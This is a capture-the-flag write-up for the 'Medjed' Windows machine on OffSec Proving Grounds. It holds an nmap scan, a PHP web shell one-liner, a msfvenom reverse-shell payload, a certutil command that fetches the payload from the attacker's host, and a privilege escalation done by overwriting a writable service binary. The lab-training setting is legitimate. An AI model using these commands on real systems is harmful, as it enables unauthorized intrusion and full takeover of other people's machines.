# Medjed

## Intro

Medjed is an intermediate windows machine from offsec proving grounds.

## Nmap

All tcp port scan.

```
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
3306/tcp  open  mysql?        syn-ack ttl 125
5040/tcp  open  unknown       syn-ack ttl 125
7680/tcp  open  pando-pub?    syn-ack ttl 125
8000/tcp  open  http-alt      syn-ack ttl 125 BarracudaServer.com (Windows)
30021/tcp open  ftp           syn-ack ttl 125 FileZilla ftpd 0.9.41 beta
33033/tcp open  unknown       syn-ack ttl 125
44330/tcp open  ssl/unknown   syn-ack ttl 125
45332/tcp open  http          syn-ack ttl 125 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
45443/tcp open  http          syn-ack ttl 125 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```

## User

After browsing to port 8000, barracuda is asking for a first time admin set up.

Create a php one liner.

```
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

Upload to the following directory using barracuda.

```
C:\xampp\htdocs
```

Execute a system command.

```
http://192.168.157.127:45332/shell.php?cmd=whoami
```

Create the shell.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.166 LPORT=5040 -f exe > shell.exe
```

Upload the shell.

```
http://192.168.157.127:45332/shell.php?cmd=certutil%20-urlcache%20-split%20-f%20http://192.168.45.166:8000/shell.exe%20%20C:\Users\Jerren\Desktop\shell.exe
```

After executing, a shell is received as jerren.

## Admin

We have read/write access to the barracuda binary.

Move the binary.

```
move C:\bd\bd.exe
```

Copy another msfvenom shell to the directory.

```
copy /y admin.exe C:\bd\bd.exe
```

Restart.

```
shutdown /r
```
